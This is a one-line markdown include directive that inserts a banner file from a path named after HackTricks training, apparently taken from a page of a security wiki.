{{#include ../../../banners/hacktricks-training.md}}
